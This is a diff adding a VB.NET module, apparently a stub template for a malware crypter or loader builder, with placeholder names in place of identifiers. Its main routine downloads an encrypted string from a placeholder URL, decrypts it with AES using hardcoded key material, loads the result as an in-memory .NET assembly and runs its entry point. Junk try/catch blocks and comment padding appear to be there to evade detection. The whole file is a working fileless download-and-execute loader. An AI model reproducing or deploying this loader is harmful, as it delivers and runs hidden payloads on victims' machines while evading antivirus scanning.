@@ -1,0 +1,114 @@
+Imports System.Security.Cryptography
+Imports System.Text
+Imports System.IO
+
+Module %1%
+
+
+    Sub main()
+
+        Dim %2% As New Net.WebClient()
+		   Try
+
+
+        Catch ex As Exception
+            Dim kdfjkjf As Double = 985786857867
+            Dim lofdfdf As String = "sdo;ifj;slkdjf;skjdfjksd;fkj"
+            Dim hhhhhh As String = "asdfasdfkj;lkjfdkjsd;fkjfd"
+
+        End Try
+
+
+        Dim %3% As String = %2%.DownloadString("%100%")
+
+
+
+        Dim %4% As Byte() = Convert.FromBase64String(%6%( %3%))
+
+		   Try
+
+
+        Catch ex As Exception
+            Dim kdfjkjf As Double = 985786857867
+            Dim lofdfdf As String = "sdo;ifj;slkdjf;skjdfjksd;fkj"
+            Dim hhhhhh As String = "asdfasdfkj;lkjfdkjsd;fkjfd"
+
+        End Try
+
+		'''''''''''''''''''''''''''''''''''''''''''''
+
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''	'''''''''''''''''''''''''''''''''''''''''''''
+
+			'''''''''''''''''''''''''''''''''''''''''''''
+
+        Dim %5% As Object = Reflection.Assembly.Load(%4%)
+        %5%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+
+
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+			'''''''''''''''''''''''''''''''''''''''''''''
+
+
+
+    End Sub
+
+    Public Function %6%(ByVal cipherText As String) As String
+        Dim %7% As String = "yourPassPhrase"
+        Dim  %8% As String = "mySaltValue"
+        Dim %9% As String = "SHA1"
+        Dim %10% As Integer = 2
+        Dim %11% As String = "@1B2c3D4e5F6g7H8"
+        Dim keySize As Integer = 256
+        Dim %12% As Byte() = Encoding.ASCII.GetBytes(%11%)
+        Dim %13% As Byte() = Encoding.ASCII.GetBytes( %8%)
+        Dim %14% As Byte() = Convert.FromBase64String(cipherText)
+        Dim %15% As New PasswordDeriveBytes(%7%, %13%, %9%, %10%)
+        Dim %16% As Byte() = %15%.GetBytes(keySize \ 8)
+        Dim %17% As New RijndaelManaged()
+        %17%.Mode = CipherMode.CBC
+        Dim %18% As ICryptoTransform = %17%.CreateDecryptor(%16%, %12%)
+        Dim %19% As New MemoryStream(%14%)
+        Dim %20% As New CryptoStream(%19%, %18%, CryptoStreamMode.Read)
+        Dim %21% As Byte() = New Byte(%14%.Length - 1) {}
+        Dim %22% As Integer = %20%.Read(%21%, 0, %21%.Length)
+        %19%.Close()
+        %20%.Close()
+        Dim %23% As String = Encoding.UTF8.GetString(%21%, 0, %22%)
+        Return %23%
+    End Function
+
+
+End Module
